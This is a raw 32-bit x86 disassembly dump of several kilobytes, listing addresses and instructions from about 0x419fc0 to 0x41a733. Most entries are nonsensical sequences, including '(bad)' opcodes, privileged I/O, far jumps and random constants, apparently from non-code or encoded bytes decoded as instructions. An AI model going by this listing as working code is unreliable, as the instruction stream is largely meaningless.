  419fc0:	inc    esp
  419fc1:	frstor [edi-0x6f04b6fe]
  419fc7:	or     BYTE PTR [edi+0x76],al
  419fca:	mov    edi,0x15e1fe09
  419fcf:	and    eax,0x9b36cee2
  419fd4:	push   eax
  419fd5:	ja     0x419fb4
  419fd7:	ror    BYTE PTR [ebx+0x7799e5e9],1
  419fdd:	les    esp,FWORD PTR [ebx-0x72f07ca6]
  419fe3:	shl    BYTE PTR [ebp+0x21d5b8fb],cl
  419fe9:	xchg   ebx,esi
  419feb:	aaa    
  419fec:	ins    BYTE PTR es:[edi],dx
  419fed:	cmp    eax,0xbf6dada5
  419ff2:	mov    WORD PTR [eax-0x675a6812],fs
  419ff8:	into   
  419ff9:	cdq    
  419ffa:	lock push eax
  419ffc:	sbb    eax,0xf564425a
  41a001:	in     al,0x1f
  41a003:	out    dx,al
  41a004:	data16 and dl,cl
  41a007:	adc    BYTE PTR [ebx+0x77],bl
  41a00a:	dec    esp
  41a00b:	test   BYTE PTR cs:[ebx-0x297af761],ch
  41a012:	mov    bh,0xd7
  41a014:	sti    
  41a015:	inc    ebp
  41a016:	xchg   ebx,eax
  41a017:	jmp    0x937b:0xa56041df
  41a01e:	hlt    
  41a01f:	or     esp,DWORD PTR [esi*1+0x19815b9c]
  41a026:	sar    al,1
  41a028:	arpl   WORD PTR [esi-0x6c],sp
  41a02b:	xor    esi,DWORD PTR [edx+0x3e]
  41a02e:	mov    eax,0xb6286623
  41a033:	iret   
  41a034:	leave  
  41a035:	jl     0x41a08d
  41a037:	data16 outs dx,BYTE PTR ds:[esi]
  41a039:	std    
  41a03a:	push   ecx
  41a03b:	adc    eax,ebp
  41a03d:	nop
  41a03e:	fisttp WORD PTR [ecx]
  41a040:	push   edi
  41a041:	pop    edx
  41a042:	xchg   ebp,eax
  41a043:	(bad)  
  41a044:	dec    ebx
  41a045:	xchg   esp,eax
  41a046:	out    0xe,al
  41a048:	ins    BYTE PTR es:[edi],dx
  41a049:	out    dx,eax
  41a04a:	xchg   edx,eax
  41a04b:	lods   eax,DWORD PTR ds:[esi]
  41a04c:	hlt    
  41a04d:	fucomi st,st(0)
  41a04f:	int    0xf7
  41a051:	std    
  41a052:	dec    ecx
  41a053:	xchg   ebx,eax
  41a054:	popa   
  41a055:	outs   dx,BYTE PTR ds:[esi]
  41a056:	adc    cl,bl
  41a058:	vmread DWORD PTR [ecx+0x31],ebp
  41a05c:	mov    esi,0x446e03b5
  41a061:	push   es
  41a062:	xchg   edx,eax
  41a063:	(bad)  
  41a064:	mov    al,0xc2
  41a066:	xchg   esp,eax
  41a067:	into   
  41a068:	test   BYTE PTR [ebx],ch
  41a06a:	out    dx,al
  41a06b:	rcl    DWORD PTR [esi-0x1c],1
  41a06e:	pop    es
  41a06f:	xchg   BYTE PTR [eax+0x7af39ae8],al
  41a075:	push   edx
  41a076:	sub    bl,dl
  41a078:	popa   
  41a079:	inc    ebx
  41a07a:	mov    al,ds:0x1f555f5a
  41a07f:	mov    ecx,0x77466c49
  41a084:	pop    ecx
  41a085:	icebp  
  41a086:	pop    esp
  41a087:	mov    cl,0x66
  41a089:	dec    ecx
  41a08a:	add    al,0xb3
  41a08c:	add    BYTE PTR [esi+0x19e10697],ah
  41a092:	push   edx
  41a093:	shr    BYTE PTR [eax+0x2c],1
  41a096:	iret   
  41a097:	das    
  41a098:	sub    BYTE PTR [bx+si+0x2c],dh
  41a09c:	inc    eax
  41a09d:	xor    ch,dh
  41a09f:	ret    
  41a0a0:	fs aas 
  41a0a2:	sbb    dh,BYTE PTR [edi+0x10]
  41a0a5:	cli    
  41a0a6:	xchg   DWORD PTR [ebp+ebx*2+0x53],ebx
  41a0aa:	or     esi,DWORD PTR [ebx-0x6c]
  41a0ad:	aad    0xa6
  41a0af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0b0:	pop    eax
  41a0b1:	(bad)
  41a0b4:	jp     0x41a0b1
  41a0b6:	add    ebx,DWORD PTR [edi]
  41a0b8:	ret    0xd187
  41a0bb:	lods   al,BYTE PTR ds:[esi]
  41a0bc:	mov    esp,0x63efdba6
  41a0c1:	mov    ds:0x2c31a30d,al
  41a0c6:	arpl   WORD PTR [esi+0x10],di
  41a0c9:	aas    
  41a0ca:	cmp    eax,0x8876f07a
  41a0cf:	push   ecx
  41a0d0:	cmp    esp,DWORD PTR [esi]
  41a0d2:	data16 (bad) 
  41a0d4:	jno    0x41a09b
  41a0d6:	mov    esp,ecx
  41a0d8:	stos   BYTE PTR es:[edi],al
  41a0d9:	jo     0x41a130
  41a0db:	push   0xdfbc1f70
  41a0e0:	adc    eax,ebx
  41a0e2:	into   
  41a0e3:	pop    ebx
  41a0e4:	cmp    BYTE PTR [edx+0x4a2bd55f],0xc3
  41a0eb:	cwde   
  41a0ec:	mov    ecx,0x535e9f31
  41a0f1:	enter  0xb4d1,0x3a
  41a0f5:	mov    edx,0x8b93bf56
  41a0fa:	(bad)  
  41a0fb:	out    dx,al
  41a0fc:	mov    edi,0xcae83ebb
  41a102:	inc    ebp
  41a103:	dec    edx
  41a104:	or     al,0xd2
  41a106:	out    0x2d,eax
  41a108:	push   cs
  41a109:	inc    ecx
  41a10a:	int    0x7e
  41a10c:	fs rol cl,0xbf
  41a110:	sub    eax,0xff6066d4
  41a115:	cwde   
  41a116:	jae    0x41a0f6
  41a118:	xchg   edi,eax
  41a119:	xchg   ebp,eax
  41a11a:	mov    ebx,0xfe76bb80
  41a11f:	cmp    cl,cl
  41a121:	les    ebx,FWORD PTR [ebx+0x1b]
  41a124:	mov    ecx,0x8931daf2
  41a129:	mov    cl,0xae
  41a12b:	out    0x5,al
  41a12d:	sbb    dh,ch
  41a12f:	dec    eax
  41a130:	mov    bh,0x15
  41a132:	adc    al,0x96
  41a134:	ret    
  41a135:	xor    edx,DWORD PTR [esi]
  41a137:	cs sbb al,0xc9
  41a13a:	pop    esi
  41a13b:	lock push esi
  41a13d:	out    dx,eax
  41a13e:	inc    ebp
  41a13f:	push   ecx
  41a140:	inc    ebx
  41a141:	jno    0x41a18c
  41a143:	add    al,BYTE PTR [edx+0x551deda5]
  41a149:	and    BYTE PTR [ebx+0x48df71da],al
  41a14f:	scas   eax,DWORD PTR es:[edi]
  41a150:	mov    bl,0x13
  41a152:	dec    edi
  41a153:	dec    ebx
  41a154:	push   ecx
  41a155:	mov    ds:0x97681cbd,al
  41a15a:	pop    esi
  41a15b:	stos   BYTE PTR es:[edi],al
  41a15c:	inc    ebx
  41a15d:	inc    ebp
  41a15e:	stos   DWORD PTR es:[edi],eax
  41a15f:	xor    BYTE PTR [ebx],bl
  41a161:	cmp    DWORD PTR [ecx+0x782ca8d5],ebp
  41a167:	fnsave [edx+0x7b]
  41a16a:	cmovp  esp,DWORD PTR [ebx-0x3e]
  41a16e:	and    eax,0xb4b4ba7d
  41a173:	cli    
  41a174:	lods   al,BYTE PTR ds:[esi]
  41a175:	cmp    BYTE PTR [ebp+0x613ca9d9],al
  41a17b:	int    0xb2
  41a17d:	clc    
  41a17e:	jecxz  0x41a154
  41a180:	mov    edx,0xfee84c8f
  41a185:	test   eax,0xb5714489
  41a18a:	leave  
  41a18b:	or     dl,cl
  41a18d:	jle    0x41a168
  41a18f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a190:	adc    eax,0x60cebaa9
  41a195:	test   BYTE PTR [eax],al
  41a197:	pop    eax
  41a198:	or     dh,BYTE PTR [ebx]
  41a19a:	sbb    ebx,DWORD PTR [edx-0x7]
  41a19d:	mov    BYTE PTR [eax+0x557e5203],bl
  41a1a3:	mov    ds:0x6b2c5c74,al
  41a1a8:	es iret 
  41a1aa:	fs stos DWORD PTR es:[edi],eax
  41a1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1ad:	fs stos DWORD PTR es:[edi],eax
  41a1af:	jmp    0x4d03:0x4d696358
  41a1b6:	icebp  
  41a1b7:	jno    0x41a19a
  41a1b9:	push   eax
  41a1ba:	xchg   esi,eax
  41a1bb:	sub    al,0xb8
  41a1bd:	nop
  41a1be:	fist   WORD PTR [ebp+0x64]
  41a1c1:	jb     0x41a1b1
  41a1c3:	pushf  
  41a1c4:	inc    ebp
  41a1c5:	hlt    
  41a1c6:	fstp   DWORD PTR [eax+0x41]
  41a1c9:	fcmovbe st,st(2)
  41a1cb:	cmp    edx,DWORD PTR [esi]
  41a1cd:	mov    al,0x9c
  41a1cf:	and    al,0x40
  41a1d1:	out    0x6f,eax
  41a1d3:	sub    bh,BYTE PTR [ecx]
  41a1d5:	icebp  
  41a1d6:	push   eax
  41a1d7:	add    ch,BYTE PTR [edx-0x53]
  41a1da:	cmp    edx,ecx
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	rol    bh,cl
  41a209:	push   0x7d1c6e2e
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	lahf   
  41a214:	daa    
  41a215:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41a217:	rcr    BYTE PTR [edx+0x48],1
  41a21a:	mov    al,ds:0x3ad633c2
  41a21f:	cmp    DWORD PTR [edi+0x62],esp
  41a222:	pop    ss
  41a223:	in     al,dx
  41a224:	fs in  al,0x15
  41a227:	push   esp
  41a228:	jo     0x41a1ef
  41a22a:	dec    ebx
  41a22b:	cmp    ah,bl
  41a22d:	or     BYTE PTR [ebx-0x9c88f7c],dl
  41a233:	in     eax,0xae
  41a235:	lods   al,BYTE PTR ds:[esi]
  41a236:	mov    bh,0xd3
  41a238:	es cmp eax,0x88a92634
  41a23e:	push   esi
  41a23f:	das    
  41a240:	out    dx,eax
  41a241:	sub    eax,0xe0c38c64
  41a246:	adc    DWORD PTR [ebx-0x3fade9fd],esp
  41a24c:	sahf   
  41a24d:	inc    edi
  41a24e:	cmp    al,0x68
  41a250:	iret   
  41a251:	dec    eax
  41a252:	stos   DWORD PTR es:[edi],eax
  41a253:	mov    al,ds:0xd9c76dc3
  41a258:	imul   edx,DWORD PTR [ecx+0x11bf11a1],0x36
  41a25f:	pop    ss
  41a260:	add    al,0x61
  41a262:	mov    ah,0x1b
  41a264:	sbb    al,BYTE PTR [eax+0x8]
  41a267:	dec    ebx
  41a268:	pop    edi
  41a269:	bound  esi,QWORD PTR [ebx]
  41a26b:	mov    dl,0x9a
  41a26d:	adc    dh,BYTE PTR [edi]
  41a26f:	mov    ah,BYTE PTR [bx-0x74]
  41a273:	adc    ebp,DWORD PTR [edi]
  41a275:	add    edx,ebp
  41a277:	sub    al,0xf1
  41a279:	psubsb mm2,QWORD PTR [edi]
  41a27c:	pop    edx
  41a27d:	inc    eax
  41a27e:	lahf   
  41a27f:	std    
  41a280:	enter  0x6b13,0x2b
  41a284:	test   al,0x5f
  41a286:	std    
  41a287:	and    eax,0xf7fdc4ea
  41a28c:	das    
  41a28d:	into   
  41a28e:	pushf  
  41a28f:	inc    esi
  41a290:	push   DWORD PTR [ecx-0x58]
  41a293:	or     DWORD PTR [edx],eax
  41a295:	pop    ds
  41a296:	xor    cl,BYTE PTR [esi+eax*4+0xc]
  41a29a:	sti    
  41a29b:	inc    edi
  41a29c:	add    ch,BYTE PTR [eax+0xe7f362]
  41a2a2:	and    DWORD PTR [ecx-0x5dda8b9d],0x51d006bc
  41a2ac:	adc    eax,0x9f5f06f0
  41a2b1:	jbe    0x41a2bf
  41a2b3:	ds rcl cl,1
  41a2b6:	or     DWORD PTR [esi-0xb],esp
  41a2b9:	xchg   edi,eax
  41a2ba:	mov    ds:0x8082dcee,eax
  41a2bf:	mov    cl,0xcd
  41a2c1:	not    DWORD PTR [eax]
  41a2c3:	ja     0x41a309
  41a2c5:	xor    DWORD PTR [ebp+0x75ffbd74],0x753ef091
  41a2cf:	adc    ah,BYTE PTR [ecx-0x6b3085e6]
  41a2d5:	dec    ebx
  41a2d6:	into   
  41a2d7:	jmp    0x1dc6e37f
  41a2dc:	or     BYTE PTR [eax],0x9a
  41a2df:	mov    bh,0x4e
  41a2e1:	add    al,bh
  41a2e3:	shl    BYTE PTR [edx+ebp*2+0x2d],cl
  41a2e7:	fcomip st,st(0)
  41a2e9:	add    al,0x26
  41a2eb:	sub    al,0x43
  41a2ed:	mov    bl,0x16
  41a2ef:	pop    ebx
  41a2f0:	inc    ebp
  41a2f1:	sbb    edi,DWORD PTR [edi+edi*1]
  41a2f4:	out    dx,eax
  41a2f5:	cwde   
  41a2f6:	ins    DWORD PTR es:[edi],dx
  41a2f7:	out    0x19,al
  41a2f9:	sbb    BYTE PTR [ecx],cl
  41a2fb:	mov    al,0x19
  41a2fd:	sub    bh,ah
  41a2ff:	aad    0x4
  41a301:	and    edx,DWORD PTR [esi+ebp*4-0x257afb63]
  41a308:	dec    ebx
  41a309:	jmp    0x81e89173
  41a30e:	jp     0x41a37a
  41a310:	or     DWORD PTR ds:0xfa19534b,0x18
  41a317:	arpl   WORD PTR [esi+0x48],bp
  41a31a:	mov    eax,ds:0xd2c3d8c1
  41a31f:	loop   0x41a328
  41a321:	enter  0x63f1,0xa4
  41a325:	mov    ch,0x5d
  41a327:	dec    ebx
  41a328:	mov    ebx,0xbd89f82c
  41a32d:	add    al,0xf6
  41a32f:	jo     0x41a2f9
  41a331:	daa    
  41a332:	push   esi
  41a333:	jmp    0x41a35b
  41a335:	pop    eax
  41a336:	sbb    BYTE PTR [ecx+0x50],dl
  41a339:	sbb    edx,DWORD PTR [esi]
  41a33b:	das    
  41a33c:	inc    ebx
  41a33d:	or     ah,al
  41a33f:	xor    cl,BYTE PTR [edi+0x6dfdbb3a]
  41a345:	add    ch,BYTE PTR [eax-0x16b7bb5d]
  41a34b:	adc    eax,0x5ac4d111
  41a350:	imul   edx,esi,0xab51fad5
  41a356:	fcom   QWORD PTR [ebp-0x2a]
  41a359:	cmp    DWORD PTR [edx-0x4ad04336],esp
  41a35f:	pop    ds
  41a360:	and    BYTE PTR [eax+0x408e848d],0x96
  41a367:	mov    ds,WORD PTR [ebx-0x45]
  41a36a:	(bad)  
  41a36b:	rcr    BYTE PTR [esi-0x33],1
  41a36e:	pop    edx
  41a36f:	clc    
  41a370:	push   cs
  41a371:	jne    0x41a2f8
  41a373:	xchg   DWORD PTR [eax-0xe1cf1e2],esi
  41a379:	xchg   ebp,eax
  41a37a:	dec    edx
  41a37b:	push   esp
  41a37c:	or     cl,dh
  41a37e:	xor    edi,DWORD PTR [esi]
  41a380:	add    DWORD PTR [esi],ebp
  41a382:	push   0xffffff96
  41a384:	jnp    0x3766bd56
  41a38a:	retf   0x1018
  41a38d:	mov    WORD PTR [ebx-0x5f],es
  41a390:	addr16 xchg ebx,eax
  41a392:	sub    eax,0x47b3b389
  41a397:	ffreep st(1)
  41a399:	aad    0x13
  41a39b:	add    eax,0x84d929d8
  41a3a0:	jmp    0xe32a:0x721ff73f
  41a3a7:	dec    edi
  41a3a8:	scas   al,BYTE PTR es:[edi]
  41a3a9:	scas   al,BYTE PTR es:[edi]
  41a3aa:	out    0xd,al
  41a3ac:	and    BYTE PTR [ebx-0x74f02017],ch
  41a3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3b3:	cmp    al,0xbf
  41a3b5:	push   es
  41a3b6:	xchg   DWORD PTR gs:[esi-0x1bc07fd],edi
  41a3bd:	mov    ebp,0x7fceb3f2
  41a3c2:	and    al,0xed
  41a3c4:	jmp    0x3fdda188
  41a3c9:	scas   al,BYTE PTR es:[edi]
  41a3ca:	or     al,0x76
  41a3cc:	mov    ah,0xae
  41a3ce:	inc    edi
  41a3cf:	scas   eax,DWORD PTR es:[edi]
  41a3d0:	push   ds
  41a3d1:	outs   dx,DWORD PTR ds:[esi]
  41a3d2:	or     ebp,edx
  41a3d4:	fadd   DWORD PTR [eax]
  41a3d6:	add    edx,DWORD PTR [ebx]
  41a3d8:	mov    ebx,DWORD PTR [edx]
  41a3da:	jle    0x41a421
  41a3dc:	xchg   esp,eax
  41a3dd:	push   0xffffffee
  41a3df:	or     BYTE PTR [eax+0x3d1d7f8],bl
  41a3e5:	hlt    
  41a3e6:	push   eax
  41a3e7:	fdiv   QWORD PTR [esi]
  41a3e9:	mov    DWORD PTR [edx-0x2c2a093c],esp
  41a3ef:	and    BYTE PTR [esi],al
  41a3f1:	aas    
  41a3f2:	pushf  
  41a3f3:	(bad)  [esp+ebx*2-0x2f37c3c5]
  41a3fa:	das    
  41a3fb:	fs sbb eax,0x2c0777f1
  41a401:	mov    ebx,0xa8ce833d
  41a406:	push   0xc7b64d63
  41a40b:	jg     0x41a452
  41a40d:	ins    DWORD PTR es:[edi],dx
  41a40e:	pop    ebp
  41a40f:	inc    edx
  41a410:	lock jns 0x41a478
  41a413:	or     al,0xff
  41a415:	fwait
  41a416:	xchg   eax,ecx
  41a418:	inc    esi
  41a419:	jp     0x41a3ba
  41a41b:	mov    bl,0xfc
  41a41d:	pusha  
  41a41e:	push   ds
  41a41f:	lods   eax,DWORD PTR ds:[esi]
  41a420:	mov    ecx,ebx
  41a422:	xor    dl,BYTE PTR [ecx+0x39245da9]
  41a428:	dec    esi
  41a429:	mov    ebx,0xeb39f8dc
  41a42e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a42f:	cwde   
  41a430:	xor    ch,BYTE PTR [esi]
  41a432:	dec    eax
  41a433:	cdq    
  41a434:	retf   0x6dd9
  41a437:	fchs   
  41a439:	push   esp
  41a43a:	xchg   esi,eax
  41a43b:	popf   
  41a43c:	add    BYTE PTR [ebx+esi*2],dh
  41a43f:	inc    esp
  41a440:	cld    
  41a441:	enter  0xf469,0x92
  41a445:	xlat   BYTE PTR ds:[ebx]
  41a446:	stos   DWORD PTR es:[edi],eax
  41a447:	pop    es
  41a448:	sbb    al,0xb1
  41a44a:	sbb    BYTE PTR [edx-0x6],bl
  41a44d:	es xchg edx,eax
  41a44f:	les    edi,FWORD PTR [ebx+ebx*1-0x28f9f175]
  41a456:	stc    
  41a457:	adc    eax,0x4468a970
  41a45c:	adc    DWORD PTR [edx-0x2],ebx
  41a45f:	(bad)  
  41a460:	mov    ebp,0x3a036d41
  41a465:	push   ebx
  41a466:	arpl   WORD PTR [esi+0x79520557],dx
  41a46c:	inc    ecx
  41a46d:	push   ebx
  41a46e:	shl    BYTE PTR [edx],1
  41a470:	or     DWORD PTR [edi+ebx*2+0x619b3345],0x8477e96d
  41a47b:	jno    0x41a472
  41a47d:	inc    edx
  41a47e:	cmp    eax,0xcd88d932
  41a483:	xchg   DWORD PTR [ecx+0x57272d51],edx
  41a489:	push   es
  41a48a:	je     0x41a4ab
  41a48c:	sub    edi,DWORD PTR [ebx-0x33]
  41a48f:	inc    ebp
  41a490:	sub    al,0x92
  41a492:	mov    BYTE PTR [ebx+0x73ef34ea],bl
  41a498:	sysexit 
  41a49a:	and    al,0x86
  41a49c:	dec    ecx
  41a49d:	mov    edi,0xb25e864c
  41a4a2:	fisttp DWORD PTR [edx+0x3900a5a3]
  41a4a8:	frstor [edi+0xb]
  41a4ab:	add    BYTE PTR [eax+0x7c],dh
  41a4ae:	fimul  WORD PTR [eax]
  41a4b0:	mov    ah,0xfc
  41a4b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4b3:	pop    esp
  41a4b4:	lds    eax,FWORD PTR [edx+0x636ef0e8]
  41a4ba:	rol    DWORD PTR [esi-0x7b],0x28
  41a4be:	inc    edx
  41a4bf:	outs   dx,DWORD PTR ds:[esi]
  41a4c0:	arpl   WORD PTR [edi+ecx*4],di
  41a4c3:	out    dx,eax
  41a4c4:	push   ecx
  41a4c5:	cmp    ah,BYTE PTR [edi]
  41a4c7:	push   es
  41a4c8:	cdq    
  41a4c9:	xchg   ebx,eax
  41a4ca:	addr16 popa 
  41a4cc:	div    BYTE PTR ds:0x6a1b203c
  41a4d2:	cs retf 
  41a4d4:	lahf   
  41a4d5:	dec    ebp
  41a4d6:	mov    DWORD PTR [edx+0x2c],ecx
  41a4d9:	fld    TBYTE PTR [ebx]
  41a4db:	push   DWORD PTR [ebp-0x18]
  41a4de:	pop    edi
  41a4df:	xchg   DWORD PTR ds:0x5813b424,ebx
  41a4e5:	pop    ebp
  41a4e6:	and    eax,0x2a70af23
  41a4eb:	call   0xd7662641
  41a4f0:	jp     0x41a48b
  41a4f2:	out    0x4b,eax
  41a4f4:	dec    esi
  41a4f5:	(bad)  
  41a4f6:	shl    BYTE PTR [esi*8-0x6c46adc1],cl
  41a4fd:	mov    ebx,0x429d2b05
  41a502:	or     BYTE PTR [ecx],cl
  41a504:	(bad)  
  41a505:	cld    
  41a506:	push   0x79b17d30
  41a50b:	lahf   
  41a50c:	inc    ebp
  41a50d:	retf   0xb371
  41a510:	pop    ebp
  41a511:	xor    al,0x20
  41a513:	xchg   ecx,eax
  41a514:	dec    esp
  41a515:	ds jne 0x41a4a9
  41a518:	rcr    edx,cl
  41a51a:	ds hlt 
  41a51c:	xor    cl,BYTE PTR [edi+0x6]
  41a51f:	xchg   esi,eax
  41a520:	jne    0x41a4d2
  41a522:	dec    edx
  41a523:	push   es
  41a524:	lods   eax,DWORD PTR ds:[esi]
  41a525:	jne    0x41a4cf
  41a527:	mov    ecx,0x4ebfa725
  41a52c:	add    BYTE PTR [edi-0x3f],dl
  41a52f:	mov    ch,0x4f
  41a531:	and    eax,0x7f6bbb70
  41a536:	dec    edi
  41a537:	sbb    eax,0xa6db0662
  41a53c:	and    DWORD PTR ds:[ebp+0x4007c84],edi
  41a543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a544:	mov    ds:0x26e862b4,al
  41a549:	stos   BYTE PTR es:[edi],al
  41a54a:	xor    esi,ecx
  41a54c:	scas   eax,DWORD PTR es:[edi]
  41a54d:	mov    eax,ds:0xe0b2c262
  41a552:	push   ebp
  41a553:	push   ds
  41a554:	push   es
  41a555:	fs cs in al,dx
  41a558:	js     0x41a5ca
  41a55a:	pop    ebx
  41a55b:	fstp   QWORD PTR [edi-0x57]
  41a55e:	push   edx
  41a55f:	ins    DWORD PTR es:[edi],dx
  41a560:	cs int3 
  41a562:	shr    ah,1
  41a564:	(bad)  
  41a566:	call   0xcf04d0c6
  41a56b:	mov    WORD PTR [esp+edi*2-0x5b4ad93e],es
  41a572:	sbb    al,0x25
  41a574:	inc    edi
  41a575:	pop    esp
  41a576:	in     eax,0x48
  41a578:	dec    ebx
  41a579:	int    0x3e
  41a57b:	fnstsw WORD PTR [esp+edx*8+0x52c5bb1a]
  41a582:	retf   0x79a2
  41a585:	test   eax,0xac8769c6
  41a58a:	sub    bh,ah
  41a58c:	int    0x61
  41a58e:	mov    dl,0xcb
  41a590:	imul   eax,DWORD PTR [ebx*4-0x3df995da],0xfffffff3
  41a598:	dec    ebx
  41a599:	rcr    esp,1
  41a59b:	mov    dl,0x67
  41a59d:	sbb    eax,0x89ab51a
  41a5a2:	call   0x8c0de446
  41a5a7:	test   DWORD PTR [ebx+0x14fa8d19],0x53109ade
  41a5b1:	mov    dl,0xfd
  41a5b3:	mov    dh,0xa9
  41a5b5:	popf   
  41a5b6:	dec    ebp
  41a5b7:	inc    edi
  41a5b8:	ror    BYTE PTR [ecx+esi*2],cl
  41a5bb:	mov    dh,0x16
  41a5bd:	aad    0xfd
  41a5bf:	mov    ebp,0x883969cd
  41a5c4:	rcr    ecx,1
  41a5c6:	loopne 0x41a606
  41a5c8:	sub    BYTE PTR [ebx],bh
  41a5ca:	mov    al,ds:0xcb9a9432
  41a5cf:	push   fs
  41a5d1:	fiadd  DWORD PTR [ecx+0x3a1d0912]
  41a5d7:	cwde   
  41a5d8:	cmc    
  41a5d9:	cdq    
  41a5da:	ret    0x187d
  41a5dd:	mov    ds:0xbcb1649d,al
  41a5e2:	sbb    eax,0x2f81e6a
  41a5e7:	sti    
  41a5e8:	sub    al,0x6b
  41a5ea:	ja     0x41a661
  41a5ec:	mov    dh,0x1f
  41a5ee:	pop    ebx
  41a5ef:	scas   eax,DWORD PTR es:[edi]
  41a5f0:	js     0x41a5bc
  41a5f2:	hlt    
  41a5f3:	dec    esp
  41a5f4:	cmp    ebx,esi
  41a5f6:	loope  0x41a66d
  41a5f8:	neg    BYTE PTR [esp+ebp*1-0x71e11af0]
  41a5ff:	(bad)  
  41a600:	pop    es
  41a601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a602:	inc    ecx
  41a603:	add    BYTE PTR [eax],al
  41a605:	loope  0x41a5d3
  41a607:	jnp    0x41a64a
  41a609:	and    BYTE PTR [edx],ch
  41a60b:	jp     0x41a679
  41a60d:	xchg   ecx,eax
  41a60e:	out    0xa,al
  41a610:	push   ebx
  41a611:	sub    edx,edi
  41a613:	mov    dl,0x2
  41a615:	mov    BYTE PTR [edi],0x77
  41a618:	adc    DWORD PTR [edx+0x5a],ebp
  41a61b:	lds    ebp,FWORD PTR [edx+eax*1]
  41a61e:	in     eax,dx
  41a61f:	lock push esp
  41a621:	sbb    BYTE PTR [ebp-0x79],bl
  41a624:	pop    eax
  41a625:	mov    ebx,0x60cd97dd
  41a62a:	ret    0x685c
  41a62d:	inc    esi
  41a62e:	stos   DWORD PTR es:[edi],eax
  41a62f:	cs pop ebp
  41a631:	popa   
  41a632:	mov    al,0x55
  41a634:	shl    BYTE PTR [ecx],cl
  41a636:	(bad)  
  41a637:	pop    ebx
  41a638:	ss mov ebp,0x367cc86b
  41a63e:	cmp    al,0x51
  41a640:	dec    ebp
  41a641:	or     al,0x7e
  41a643:	sub    eax,0xace375bd
  41a648:	sti    
  41a649:	xchg   edx,eax
  41a64a:	ja     0x41a65a
  41a64c:	xor    eax,0x8ac79aac
  41a651:	pop    ds
  41a652:	xacquire xchg DWORD PTR [ecx-0x160a4451],esi
  41a659:	test   eax,0x6cdee502
  41a65e:	and    bh,0x81
  41a661:	xchg   ebx,eax
  41a662:	retf   
  41a663:	(bad)  
  41a664:	mov    BYTE PTR [ecx+0x57f42689],dh
  41a66a:	add    bl,BYTE PTR [edx-0x4f]
  41a66d:	mov    esi,0x102ce378
  41a672:	mov    BYTE PTR [eax+0x69],ch
  41a675:	sbb    bl,al
  41a677:	ins    BYTE PTR es:[edi],dx
  41a678:	rcr    DWORD PTR [ebx+0x52],0x1a
  41a67c:	or     eax,0x97b3b58f
  41a681:	daa    
  41a682:	fs xchg ebx,eax
  41a684:	dec    ecx
  41a685:	int3   
  41a686:	call   0x5ba5e034
  41a68b:	push   ebp
  41a68c:	stos   BYTE PTR es:[edi],al
  41a68d:	push   es
  41a68e:	nop
  41a68f:	add    BYTE PTR [ebp-0x41ec9de4],0x3e
  41a696:	inc    eax
  41a697:	inc    esp
  41a698:	test   bl,0x34
  41a69b:	pop    esp
  41a69c:	lea    esi,[eax+0x622f412d]
  41a6a2:	bnd jae 0x41a687
  41a6a5:	dec    esi
  41a6a6:	push   esi
  41a6a7:	repz jae 0x41a726
  41a6aa:	pop    ecx
  41a6ab:	int    0x1d
  41a6ad:	xchg   DWORD PTR [edi+0x1b],ebx
  41a6b0:	cmp    ebp,DWORD PTR [esi-0x60]
  41a6b3:	(bad)  
  41a6b4:	out    0xce,al
  41a6b6:	cmp    eax,0x6358350b
  41a6bb:	push   0x37
  41a6bd:	out    0x36,eax
  41a6bf:	mov    ds:0x2f2d8124,al
  41a6c4:	std    
  41a6c5:	lods   eax,DWORD PTR ds:[esi]
  41a6c6:	pop    esi
  41a6c7:	jecxz  0x41a6e7
  41a6c9:	retf   0xc0fa
  41a6cc:	mov    al,0x99
  41a6ce:	fsubr  QWORD PTR [ebx-0x3ee96cd0]
  41a6d4:	daa    
  41a6d5:	push   edx
  41a6d6:	pusha  
  41a6d7:	inc    edi
  41a6d8:	pop    eax
  41a6d9:	mov    DWORD PTR [eax],edx
  41a6db:	mov    ecx,0x98b9eaa6
  41a6e0:	mov    DWORD PTR [esi],esi
  41a6e2:	mov    eax,0x7ac64ebc
  41a6e7:	push   ecx
  41a6e8:	ds jge 0x41a6e1
  41a6eb:	rcr    BYTE PTR [eax-0xe64ad09],cl
  41a6f1:	ja     0x41a678
  41a6f3:	mov    cl,0x5f
  41a6f5:	mov    cl,0x6c
  41a6f7:	mov    eax,0x33f3654a
  41a6fc:	jae    0x41a688
  41a6fe:	jp     0x41a73c
  41a700:	dec    ebx
  41a701:	push   edx
  41a702:	mov    DWORD PTR [ebp-0x79b2337d],ebp
  41a708:	xchg   BYTE PTR [edx-0x1b1249dd],bl
  41a70e:	jns    0x41a753
  41a710:	push   ss
  41a711:	ds int3 
  41a713:	add    ah,0x5d
  41a716:	jecxz  0x41a770
  41a718:	pop    ds
  41a719:	bnd jle 0x41a786
  41a71c:	test   al,0xd5
  41a71e:	xor    BYTE PTR [eax-0x63],dl
  41a721:	stos   BYTE PTR es:[edi],al
  41a722:	sbb    BYTE PTR [edi+0x46],ah
  41a725:	test   eax,0x65c328a1
  41a72a:	shl    BYTE PTR [edx-0x71],0x19
  41a72e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a72f:	(bad)  
  41a730:	popf   
  41a731:	cs clc 
  41a733:	jbe    0x41a74f
